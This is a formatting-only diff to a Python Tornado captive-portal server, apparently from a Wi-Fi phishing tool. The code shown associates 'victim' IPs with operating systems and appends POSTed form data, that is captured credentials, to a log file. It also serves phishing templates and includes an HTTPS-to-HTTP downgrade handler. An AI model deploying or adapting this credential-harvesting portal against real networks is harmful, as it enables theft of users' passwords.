@@ -106,9 +106,8 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         # Find the victim object that corresponds to the ip address
         # And try to Discover OS by requestt
         victims_instance = victim.Victims.get_instance()
-        victims_instance.associate_victim_ip_to_os(
-            self.request.remote_ip,
-            self.request.full_url())
+        victims_instance.associate_victim_ip_to_os(self.request.remote_ip,
+                                                   self.request.full_url())
 
     def post(self):
         """
@@ -146,7 +145,8 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
                 if credential_log_path:
                     with open(credential_log_path, 'a+') as credential_log:
                         credential_log.write("{} {}".format(
-                            time.strftime(constants.CREDENTIALS_DATETIME_FORMAT),
+                            time.strftime(
+                                constants.CREDENTIALS_DATETIME_FORMAT),
                             "POST request from {0} with {1}\n".format(
                                 self.request.remote_ip, post_data)))
                 creds.append(post_data)
@@ -168,9 +168,9 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         # Find the victim object that corresponds to the ip address
         # And try to Discover OS by request
         victims_instance = victim.Victims.get_instance()
-        victims_instance.associate_victim_ip_to_os(
-            self.request.remote_ip,
-            self.request.full_url())
+        victims_instance.associate_victim_ip_to_os(self.request.remote_ip,
+                                                   self.request.full_url())
+
 
 def runHTTPServer(ip, port, ssl_port, t, em):
     global template
@@ -180,17 +180,16 @@ def runHTTPServer(ip, port, ssl_port, t, em):
     for f in em.get_ui_funcs():
         setattr(uimethods, f.__name__, f)
 
-    app = tornado.web.Application(
-        [
-            (r"/backend/.*", BackendHandler, {
-                "em": em
-            }),
-            (r"/.*", CaptivePortalHandler),
-        ],
-        template_path=template.get_path(),
-        static_path=template.get_path_static(),
-        compiled_template_cache=False,
-        ui_methods=uimethods)
+    app = tornado.web.Application([
+        (r"/backend/.*", BackendHandler, {
+            "em": em
+        }),
+        (r"/.*", CaptivePortalHandler),
+    ],
+                                  template_path=template.get_path(),
+                                  static_path=template.get_path_static(),
+                                  compiled_template_cache=False,
+                                  ui_methods=uimethods)
     app.listen(port, address=ip)
 
     ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
